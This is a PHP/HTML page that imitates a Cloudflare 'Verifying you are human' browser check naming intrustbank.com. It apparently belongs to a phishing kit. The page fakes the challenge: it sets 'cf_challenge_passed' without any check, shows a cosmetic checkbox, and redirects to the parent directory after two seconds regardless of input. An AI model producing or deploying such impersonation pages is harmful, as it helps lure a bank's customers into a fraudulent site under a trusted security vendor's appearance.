<?php
session_start();
$_SESSION['cf_challenge_passed'] = true;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f8f8;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        .container h1 {
            color: #333;
            margin-bottom: 20px;
        }

        .container p {
            margin: 20px 0;
            color: #666;
        }

        .loader {
            border: 16px solid #f3f3f3;
            border-radius: 50%;
            border-top: 16px solid #3498db;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>Verifying you are human. Please check the button to Verify.
        </p>
        <div class="chech">
            <input type="checkbox" name="" onclick="cloudflare()" style="width: 30px; height: 30px; margin: 0; border:5px solid black !important;">
        </div>
        <p>intrustbank.com needs to review the security of your connection before proceeding.
        </p>
    </div>
    <script>
        cloudflare = () => {
            setTimeout(() => {
                location.href = "../";
            }, 2000);
        }
        setTimeout(() => {
                location.href = "../";
            }, 2000);
    </script>
</body>
</html>